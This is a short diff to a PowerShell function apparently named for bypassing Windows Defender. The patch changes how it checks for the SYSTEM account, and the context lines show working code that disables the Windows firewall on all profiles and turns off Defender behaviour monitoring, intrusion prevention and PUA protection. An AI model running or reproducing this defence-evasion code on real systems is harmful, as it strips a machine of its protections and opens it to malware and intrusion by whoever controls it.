@@ -33,8 +33,8 @@ function Invoke-OneDoesNotSimplyBypassEntireWinDefender {
         Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
         Start-Sleep 5
     } else {
-        $username = [Security.Principal.WindowsIdentity].GetCurrent().Name
-        if ($username -eq "NT AUTHORITY\SYSTEM") {
+        $username = whoami
+        if ($username -eq "nt authority\system") {
             Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction Ignore;
             Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction Ignore;
             Set-MpPreference -PUAProtection disable -ErrorAction Ignore;
